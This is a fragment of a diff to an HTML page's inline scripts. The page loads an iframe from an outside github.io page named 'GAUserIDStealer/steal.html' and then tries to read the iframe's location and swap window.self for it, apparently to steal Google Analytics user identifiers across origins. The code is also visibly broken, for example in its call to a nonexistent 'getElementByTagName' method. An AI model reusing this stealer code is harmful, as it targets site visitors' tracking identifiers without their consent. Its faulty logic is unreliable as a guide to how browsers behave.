@@ -54,18 +54,7 @@
          
     
          cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
-         
-         const iframe = document.getElementById(guhappyId);
-         console.log('iframe location href: A',iframe.contentWindow.location.href);
-         console.log('iframe location origin: A',iframe.contentWindow.location.origin);
-
-         window.self=iframe.contentWindow;
-         console.log('assign cframe to window_self');
-         console.log('after self/top origin: A',window.location.origin);
-         console.log('after A: TOP',window.top.location);
-         console.log('after A: self',window.self.location);
-         
-         
+             
 //         var xhr = new XMLHttpRequest(),
 //         method = "GET",
 //         url = "https://newmangervase91.github.io/GAUserIDStealer/steal.html";
@@ -91,6 +80,20 @@
 //          close_w = setTimeout(function(){createWindow.close()}, 1000);
      }
      doFlow();
+    </script>
+    <script>
+        function checklocation(){
+         const iframe = document.getElementByTagName("iframe");
+         console.log('check_iframe location href: A',iframe.contentWindow.location.href);
+         console.log('check_iframe location origin: A',iframe.contentWindow.location.origin);
+
+         window.self=iframe.contentWindow;
+         console.log('assign cframe to window_self');
+         console.log('after self/top origin: A',window.location.origin);
+         console.log('after A: TOP',window.top.location);
+         console.log('after A: self',window.self.location);
+        }
+        checklocation();
     </script>
 </head>
 
